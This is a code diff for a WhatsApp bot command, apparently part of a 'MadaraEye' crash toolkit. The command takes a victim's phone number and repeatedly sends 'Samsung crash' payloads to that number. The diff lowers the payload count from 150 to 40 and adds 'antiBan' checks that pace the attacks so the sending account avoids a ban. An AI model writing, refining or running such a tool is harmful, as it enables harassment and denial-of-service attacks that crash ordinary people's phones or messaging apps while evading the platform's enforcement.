@@ -1,45 +1,43 @@
 'use strict';
 const { MadaraEye } = require('../../lib/madaraEye');
 const { createProgressBar } = require('../../lib/progressBar');
+const { canCrash, recordCrash } = require('../../lib/antiBan');
 
 module.exports = {
     name: 'samsung',
     aliases: ['samsungcrash', 'sscrash'],
     category: 'madaraeye',
-    desc: 'sᴀᴍsᴜɴɢ ᴄʀᴀsʜ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
+    desc: 'sᴀᴍsᴜɴɢ ᴄʀᴀsʜ',
     usage: '.samsung <number>',
     waitReact: true,
 
     async execute(sock, msg, args, ctx) {
         const s = ctx.settings;
         const prefix = s.prefix || '.';
+        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
         
         if (!args[0]) {
-            return sock.sendMessage(ctx.from, { 
-                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}samsung <number>\n📝 *Example:* ${prefix}samsung 2348012345678` 
-            }, { quoted: msg });
+            return sock.sendMessage(ctx.from, { text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}samsung <number>` }, { quoted: msg });
         }
         
         const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         
-        let eye = global.getMadaraEye?.(sock);
-        if (!eye) {
-            eye = new MadaraEye(sock);
-        }
+        try { await canCrash(phone); } catch (e) { return sock.sendMessage(ctx.from, { text: `❌ ${e.message}` }, { quoted: msg }); }
         
-        const TOTAL = 150;
+        let eye = global.getMadaraEye?.(sock);
+        if (!eye) eye = new MadaraEye(sock);
+        
+        const TOTAL = 40;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
         
         try {
             for (let i = 0; i < TOTAL; i++) {
+                try { await canCrash(phone); } catch (e) { await bar.done(`🛡️ ${e.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`); return; }
                 await eye.samsung(target);
+                await recordCrash(phone);
                 await bar.update(1, 'sᴀᴍsᴜɴɢ ᴄʀᴀsʜ');
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
             }
-            
-            await bar.done(`✅ sᴀᴍsᴜɴɢ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
-        } catch (e) {
-            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
-        }
+            await bar.done(`✅ sᴀᴍsᴜɴɢ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs`);
+        } catch (e) { await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`); }
     }
 };
